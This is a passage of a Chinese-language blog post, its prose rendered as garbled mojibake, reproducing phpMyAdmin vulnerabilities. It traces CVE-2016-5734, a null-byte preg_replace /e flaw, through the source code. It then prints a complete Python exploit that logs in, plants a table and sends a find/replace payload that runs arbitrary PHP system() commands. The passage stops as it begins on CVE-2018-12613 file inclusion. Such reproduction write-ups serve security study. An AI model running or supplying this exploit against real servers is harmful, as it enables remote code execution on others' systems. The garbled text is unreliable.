    <content type="html"><![CDATA[<h1 id="phpmyadminçš„å‡ ä¸ªæ¼æ´å¤ç°"><a href="#phpmyadminçš„å‡ ä¸ªæ¼æ´å¤ç°" class="headerlink" title="phpmyadminçš„å‡ ä¸ªæ¼æ´å¤ç°"></a>phpmyadminçš„å‡ ä¸ªæ¼æ´å¤ç°</h1><p>phpMyAdmin æ˜¯ä¼—å¤š MySQLå›¾å½¢åŒ–ç®¡ç†å·¥å…·ä¸­ä½¿ç”¨æœ€ä¸ºå¹¿æ³›çš„ä¸€ç§ï¼Œæ˜¯ä¸€æ¬¾ä½¿ç”¨PHP å¼€å‘çš„åŸºäºB/Sæ¨¡å¼çš„ MySQL å®¢æˆ·ç«¯è½¯ä»¶</p><p>phpMyAdmin ä¸ºWeb å¼€å‘äººå‘˜æä¾›äº†ç±»ä¼¼ Accessï¼ŒSQL Server çš„å›¾å½¢åŒ–æ•°æ®åº“æ“ä½œç•Œé¢ï¼Œé€šè¿‡è¯¥ç®¡ç†å·¥å…·å¯ä»¥å¯¹ MySQL è¿›è¡Œå„ç§æ“ä½œï¼Œå¦‚ä½•åˆ›å»ºæ•°æ®åº“ï¼Œæ•°æ®è¡¨å’Œç”Ÿæˆ MySQL æ•°æ®åº“è„šæœ¬æ–‡ä»¶ç­‰ã€‚</p><h1 id="CVE-2016-5734-Phpmyadminåå°ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2016-5734-Phpmyadminåå°ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2016-5734 Phpmyadminåå°ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2016-5734 Phpmyadminåå°ä»£ç æ‰§è¡Œæ¼æ´</h1><p>ä¸»è¦æ˜¯åˆ©ç”¨åœ¨php 5.4.7ä¹‹å‰çš„ç‰ˆæœ¬ä¸­preg_replaceå‡½æ•°å¯¹ç©ºå­—èŠ‚çš„é”™è¯¯å¤„ç†Bugï¼Œä½¿æ³¨å…¥çš„ä»£ç å¯è¿œç¨‹æ‰§è¡Œ.</p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a><strong>å½±å“ç‰ˆæœ¬</strong></h2><ul><li>4.6.x ç‰ˆæœ¬ï¼ˆç›´è‡³ 4.6.3ï¼‰</li><li>4.4.x ç‰ˆæœ¬ï¼ˆç›´è‡³ 4.4.15.7ï¼‰</li><li>4.0.x ç‰ˆæœ¬ï¼ˆç›´è‡³ 4.0.10.16ï¼‰</li><li>phpç‰ˆæœ¬ï¼š 4.3.0 ~5.4.6</li></ul><p>php5.0ä»¥ä¸Šå°†/eæ¨¡å¼åºŸå¼ƒäº†</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>preg_replace() å‡½æ•°æœ‰ä¸ªè¢«å¼ƒç”¨çš„ä¿®é¥°ç¬¦\eï¼Œå¦‚æœè®¾ç½®è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œpreg_replace() åœ¨è¿›è¡Œäº†å¯¹æ›¿æ¢å­—ç¬¦ä¸²çš„æ›¿æ¢ä¹‹å, å°†æ›¿æ¢åçš„å­—ç¬¦ä¸²ä½œä¸ºphp ä»£ç è¿›è¡Œæ‰§è¡Œï¼Œå¹¶ä½¿ç”¨æ‰§è¡Œç»“æœ ä½œä¸ºå®é™…å‚ä¸æ›¿æ¢çš„å­—ç¬¦ä¸²ã€‚</p><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed <span class="variable">$pattern</span> , mixed <span class="variable">$replacement</span> , mixed <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = <span class="number">-1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure><p>æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ ä»¥ replacement è¿›è¡Œæ›¿æ¢ã€‚</p><p>å‚æ•°è¯´æ˜ï¼š</p><ul><li>$pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚</li><li>$replacement: ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚</li><li>$subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚</li><li>$limit: å¯é€‰ï¼Œå¯¹äºæ¯ä¸ªæ¨¡å¼ç”¨äºæ¯ä¸ª subject å­—ç¬¦ä¸²çš„æœ€å¤§å¯æ›¿æ¢æ¬¡æ•°ã€‚ é»˜è®¤æ˜¯-1ï¼ˆæ— é™åˆ¶ï¼‰ã€‚</li><li>$count: å¯é€‰ï¼Œä¸ºæ›¿æ¢æ‰§è¡Œçš„æ¬¡æ•°</li></ul><h3 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a><strong>è¿”å›å€¼</strong></h3><p>å¦‚æœ subject æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œ preg_replace() è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œ å…¶ä»–æƒ…å†µä¸‹è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>å¦‚æœåŒ¹é…è¢«æŸ¥æ‰¾åˆ°ï¼Œæ›¿æ¢åçš„ subject è¢«è¿”å›ï¼Œå…¶ä»–æƒ…å†µä¸‹ è¿”å›æ²¡æœ‰æ”¹å˜çš„ subjectã€‚å¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œè¿”å› NULLã€‚</p><h2 id="æ¼æ´åˆ©ç”¨å‰æ"><a href="#æ¼æ´åˆ©ç”¨å‰æ" class="headerlink" title="æ¼æ´åˆ©ç”¨å‰æ"></a>æ¼æ´åˆ©ç”¨å‰æ</h2><ol><li>çŸ¥é“phpMyAdminçš„è·¯å¾„ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨è´¦å·å¯†ç ç™»å½•æˆåŠŸ</li><li>çŸ¥é“å¯¹åº”dbçš„tableï¼Œæˆ–è€…åœ¨dbä¸­æœ‰åˆ›å»ºtableçš„æƒé™</li></ol><h2 id="æ¼æ´åˆ©ç”¨ç‚¹"><a href="#æ¼æ´åˆ©ç”¨ç‚¹" class="headerlink" title="æ¼æ´åˆ©ç”¨ç‚¹"></a>æ¼æ´åˆ©ç”¨ç‚¹</h2><p>æœ¬æ¼æ´åˆ©ç”¨çš„æ˜¯åœ¨/libraries/TableSearch.class.phpä¸­çš„preg_replaceå‡½æ•°</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled.png"></p><p><code>preg_replace</code>åœ¨<code>_getRegexReplaceRows</code>ä¸­è¢«ä½¿ç”¨ï¼Œè€Œ<code>_getRegexReplaceRows</code>åˆ™æ˜¯è¢«è°ƒç”¨äº<code>getReplacePreview</code>,å¯ä»¥çœ‹åˆ°<code>preg_replace</code>è°ƒç”¨äº†ä¸‰ä¸ªå‚æ•°åˆ†åˆ«æ˜¯<code>find</code>,<code>replaceWith</code>,<code>row[0]</code>,æ¥ä¸‹æ¥è¦å¯¹è¿™ä¸‰ä¸ªå‚æ•°è¿›è¡Œæº¯æº</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%201.png"></p><p>å¹¶ä¸”å‚æ•°<code>find</code>ä¸å‚æ•°<code>replacement</code>éƒ½æ˜¯ç»è¿‡è¯¥æ–¹æ³•æ‰€ä¼ é€’çš„,</p><p>æ¥ç€æº¯æºå‘ç°<code>getReplacePreview</code>åœ¨ <code>tbl_find_replace.php</code>ä¸­è¢«ä½¿ç”¨ï¼ŒåŒæ—¶ <code>find</code> ä¸ <code>replaceWith</code>å‚æ•°ç»POSTæ–¹æ³•è¿›è¡Œä¼ é€’</p><p>è€Œ<code>tbl_find_replace.php</code>æä¾›çš„æŸ¥æ‰¾å¹¶æ›¿æ¢æ•°æ®è¡¨çš„åŠŸèƒ½/è¯¥åŠŸèƒ½æ—¶é’ˆå¯¹æŸä¸€æ•°æ®åº“ä¸­çš„æ•°æ®è¡¨è¿›è¡Œçš„æŸ¥è¯¢åŠŸèƒ½</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%202.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%202.png"></p><p>å…¶ä¸­æŸ¥æ‰¾å¯¹åº”<code>find</code>ï¼Œæ›¿æ¢ä¸ºå¯¹åº”<code>replaceWith</code>ï¼Œäºæ˜¯å‰ä¸¤ä¸ªå‚æ•°éƒ½å‘ç°æ˜¯å¯æ§çš„ï¼Œæ¥ä¸‹æ¥å°±å·®row[0]è¿™ä¸ªå‚æ•°äº†</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%203.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%203.png"></p><p>å¯ä»¥çœ‹åˆ°<code>row</code>æ¥è‡ª<code>result</code></p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%204.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%204.png"></p><p><code>result</code>æ¥è‡ª<code>Sql_query</code></p><p>æ¥ç€è·Ÿsql_query</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%205.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%205.png"></p><p>sqlè¯­å¥å¤§æ¦‚æ•´ç†å¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> $columnname ,<span class="number">1</span>,cont(<span class="operator">*</span>) </span><br><span class="line"><span class="keyword">FROM</span> database.table_name </span><br><span class="line"><span class="keyword">WHERE</span> $columnname RLIKE â€˜$findâ€™ </span><br><span class="line"><span class="keyword">COLLATE</span> $charset_bin </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> $columnname </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> $<span class="keyword">column</span> <span class="keyword">ASC</span>;</span><br></pre></td></tr></table></figure><p>å¹¶å°†è¿™ä¸ªæŸ¥è¯¢åçš„å€¼ä½œä¸ºé”®å€¼å¯¹çš„ç¬¬ä¸€ä¸ªå€¼ç»™äº† <code>preg_replace</code>å‡½æ•°çš„ä½œä¸ºç¬¬ä¸‰ä¸ªå‚æ•°ã€‚</p><p><code>PMA_TableSearch</code>ç±»çš„æ„é€ æ–¹æ³•</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%206.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%206.png"></p><p>åœ¨<code>tbl_find_replace.php</code>ä½¿ç”¨äº†è¿™ä¸ªç±»</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%207.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%207.png"></p><p>æ¥ä¸‹æ¥å›æº¯<code>db</code>å’Œ<code>table</code>ä¸¤ä¸ªå‚æ•°</p><p>å‘ç°åœ¨ <code>/libraries/common.inc.php</code> ä¸­æœ‰å®šä¹‰</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%208.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%208.png"></p><p>å‘ç°å¯ä»¥é€šè¿‡<code>request</code>æ–¹æ³•æ¥æ¥æ”¶å˜é‡å°†ä»–å˜æˆå…¨å±€å˜é‡</p><p><code>db</code>å³ä¸ºæ•°æ®åº“ï¼Œ<code>table</code>ä¸ºæ•°æ®è¡¨,æ‰€ä»¥ç¬¬ä¸‰ä¸ªå‚æ•°<code>row[0]</code>ï¼Œç»è¿‡å¯¹åˆšåˆšsqlè¯­å¥çš„åˆ†æï¼Œè·å–åˆ°çš„å†…å®¹ä¸ºæŒ‡å®šæ•°æ®åº“çš„æŒ‡å®šæ•°æ®è¡¨å†…çš„ç¬¬ä¸€ä¸ªå­—æ®µå€¼  ï¼Œè‡³æ­¤ä¸‰ä¸ªå‚æ•°å‡å¯æ§åˆ¶</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit</span></span><br><span class="line"><span class="string">Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.</span></span><br><span class="line"><span class="string">CVE: CVE-2016-5734</span></span><br><span class="line"><span class="string">Author: https://twitter.com/iamsecurity</span></span><br><span class="line"><span class="string">run: ./cve-2016-5734.py -u root --pwd=&quot;&quot; http://localhost/pma -c &quot;system(&#x27;ls -lua&#x27;);&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&quot;@iamsecurity&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;URL with path to PMA&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;PHP command(s) to eval()&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--user&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Valid PMA user&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--pwd&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Password for valid PMA user&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-d&quot;</span>, <span class="string">&quot;--dbs&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Existing database at a server&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-T&quot;</span>, <span class="string">&quot;--table&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Custom table name for exploit.&quot;</span>)</span><br><span class="line">    arguments = parser.parse_args()</span><br><span class="line">    url_to_pma = arguments.url</span><br><span class="line">    uname = arguments.user</span><br><span class="line">    upass = arguments.pwd</span><br><span class="line">    <span class="keyword">if</span> arguments.dbs:</span><br><span class="line">        db = arguments.dbs</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        db = <span class="string">&quot;test&quot;</span></span><br><span class="line">    token = <span class="literal">False</span></span><br><span class="line">    custom_table = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> arguments.table:</span><br><span class="line">        custom_table = <span class="literal">True</span></span><br><span class="line">        table = arguments.table</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table = <span class="string">&quot;prgpwn&quot;</span></span><br><span class="line">    <span class="keyword">if</span> arguments.cmd:</span><br><span class="line">        payload = arguments.cmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">&quot;system(&#x27;uname -a&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line">    size = <span class="number">32</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    <span class="comment"># you can manually add proxy support it&#x27;s very simple ;)</span></span><br><span class="line">    <span class="comment"># s.proxies = &#123;&#x27;http&#x27;: &quot;127.0.0.1:8080&quot;, &#x27;https&#x27;: &quot;127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">    s.verify = <span class="literal">False</span></span><br><span class="line">    sql = <span class="string">&#x27;&#x27;&#x27;CREATE TABLE `&#123;0&#125;` (</span></span><br><span class="line"><span class="string">      `first` varchar(10) CHARACTER SET utf8 NOT NULL</span></span><br><span class="line"><span class="string">    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span></span><br><span class="line"><span class="string">    INSERT INTO `&#123;0&#125;` (`first`) VALUES (UNHEX(&#x27;302F6500&#x27;));</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(table)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get_token</span></span><br><span class="line">    resp = s.post(url_to_pma + <span class="string">&quot;/?lang=en&quot;</span>, <span class="built_in">dict</span>(</span><br><span class="line">        pma_username=uname,</span><br><span class="line">        pma_password=upass</span><br><span class="line">    ))</span><br><span class="line">    <span class="keyword">if</span> resp.status_code <span class="keyword">is</span> <span class="number">200</span>:</span><br><span class="line">        token_place = resp.text.find(<span class="string">&quot;token=&quot;</span>) + <span class="number">6</span></span><br><span class="line">        token = resp.text[token_place:token_place + <span class="number">32</span>]</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">&quot;Cannot get valid authorization token.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> custom_table <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;is_js_confirmed&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;db&quot;</span>: db,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">            <span class="string">&quot;pos&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sql_query&quot;</span>: sql,</span><br><span class="line">            <span class="string">&quot;sql_delimiter&quot;</span>: <span class="string">&quot;;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;show_query&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;fk_checks&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SQL&quot;</span>: <span class="string">&quot;Go&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ajax_request&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ajax_page_request&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        resp = s.post(url_to_pma + <span class="string">&quot;/import.php&quot;</span>, data, cookies=requests.utils.dict_from_cookiejar(s.cookies))</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> resp.json():</span><br><span class="line">                <span class="keyword">if</span> resp.json()[<span class="string">&quot;success&quot;</span>] <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">                    first = resp.json()[<span class="string">&quot;error&quot;</span>][resp.json()[<span class="string">&quot;error&quot;</span>].find(<span class="string">&quot;&lt;code&gt;&quot;</span>)+<span class="number">6</span>:]</span><br><span class="line">                    error = first[:first.find(<span class="string">&quot;&lt;/code&gt;&quot;</span>)]</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;already exists&quot;</span> <span class="keyword">in</span> error:</span><br><span class="line">                        print(error)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">&quot;ERROR: &quot;</span> + error)</span><br><span class="line">                        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># build exploit</span></span><br><span class="line">    exploit = &#123;</span><br><span class="line">        <span class="string">&quot;db&quot;</span>: db,</span><br><span class="line">        <span class="string">&quot;table&quot;</span>: table,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">        <span class="string">&quot;goto&quot;</span>: <span class="string">&quot;sql.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;find&quot;</span>: <span class="string">&quot;0/e\0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;replaceWith&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;columnIndex&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;useRegex&quot;</span>: <span class="string">&quot;on&quot;</span>,</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ajax_request&quot;</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = s.post(</span><br><span class="line">        url_to_pma + <span class="string">&quot;/tbl_find_replace.php&quot;</span>, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        result = resp.json()[<span class="string">&quot;message&quot;</span>][resp.json()[<span class="string">&quot;message&quot;</span>].find(<span class="string">&quot;&lt;/a&gt;&quot;</span>)+<span class="number">8</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result):</span><br><span class="line">            print(<span class="string">&quot;result: &quot;</span> + result)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        print(</span><br><span class="line">            <span class="string">&quot;Exploit failed!\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Try to manually set exploit parameters like --table, --database and --token.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Remember that servers with PHP version greater than 5.4.6&quot;</span></span><br><span class="line">            <span class="string">&quot; is not exploitable, because of warning about null byte in regexp&quot;</span></span><br><span class="line">        )</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ç”¨exp-dbçš„expå¯ä»¥ç›´æ¥æ‰“å¤§æ¦‚æ˜¯å…ˆå»ºå¥½ä¸€ä¸ªåä¸º<code>prgpwn</code>çš„æ•°æ®åº“å†åœ¨é‡Œé¢å»ºä¸€ä¸ªå«<code>first</code>çš„å­—æ®µï¼Œè¿™æ ·å°±çŸ¥é“äº†dbå¯¹åº”çš„tableï¼Œæ¥äº†ä¸‹æ¥å°±åˆ©ç”¨%00æˆªæ–­æ¥ä½¿<code>preg_replaceè¢«</code>eä¿®é¥°ç¬¦æ‰€ä¿®é¥°</p><p>å³ä½¿ç”¨<code>find=</code>0/e\0,<code>replaceWith</code>=payload</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%209.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%209.png"></p><p>æœ€ç»ˆç±»ä¼¼äºæ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&quot;/0/e&quot;</span>,<span class="string">&quot;system(&#x27;xxxx&#x27;);&quot;</span>,<span class="string">&quot;0/e&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="CVE-2018-12613æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#CVE-2018-12613æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="CVE-2018-12613æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´"></a>CVE-2018-12613æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´</h1><h2 id="å½±å“ç‰ˆæœ¬-1"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><ul><li>phpmyadmin 4.8.0</li><li>phpmyadmin 4.8.0.1</li><li>phpmyadmin 4.8.1</li></ul><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ¼æ´åˆ©ç”¨ç‚¹åœ¨index.phpé‡Œçš„ä»¥ä¸‹ä»£ç </p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%2010.png" 